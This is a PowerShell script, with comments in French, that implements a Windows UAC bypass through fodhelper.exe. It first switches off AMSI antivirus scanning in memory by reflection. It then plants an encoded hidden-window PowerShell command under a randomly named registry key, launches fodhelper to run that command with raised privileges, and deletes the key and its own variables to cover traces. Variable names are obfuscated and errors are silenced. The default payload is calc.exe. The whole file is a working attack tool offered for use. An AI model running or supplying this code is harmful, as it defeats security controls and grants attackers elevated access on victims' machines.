$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

function Invoke-FodhelperBypass {
    param(
        [string]$Command = "calc.exe"
    )

    # Désactivation AMSI en mémoire
    try {
        $Zk9 = [Ref].Assembly.GetTypes()
        ForEach ($Xj7 in $Zk9) {
            if ($Xj7.Name -like "*iUtils") {
                $Vn3 = $Xj7.GetFields('NonPublic,Static')
                ForEach ($Qp5 in $Vn3) {
                    if ($Qp5.Name -eq "amsiInitFailed") {
                        $Qp5.SetValue($null, $true)
                    }
                }
            }
        }
    } catch {}

    # Génération aléatoire du nom de clé
    $Bv2 = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    $Rg9 = "HKCU:\Software\Classes\ms-settings-$Bv2\Shell\Open\command"

    # Encodage de la commande
    $Ut8 = "Start-Process `"$Command`" -WindowStyle Hidden"
    $Ky4 = [System.Text.Encoding]::Unicode.GetBytes($Ut8)
    $Nf6 = [Convert]::ToBase64String($Ky4)
    $Wp1 = "powershell -nop -w hidden -enc $Nf6"

    try {
        New-Item -Path $Rg9 -Force | Out-Null
        New-ItemProperty -Path $Rg9 -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
        Set-ItemProperty -Path $Rg9 -Name "(Default)" -Value $Wp1 -Force | Out-Null

        Start-Process "fodhelper.exe" -WindowStyle Hidden -Verb RunAs | Out-Null
        Start-Sleep -Milliseconds 2000
    }
    finally {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings-$Bv2" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Variable -Name "Ut8","Ky4","Nf6","Wp1","Rg9","Bv2" -ErrorAction SilentlyContinue
    }
}

# Exemple d'utilisation
Invoke-FodhelperBypass -Command "calc.exe"
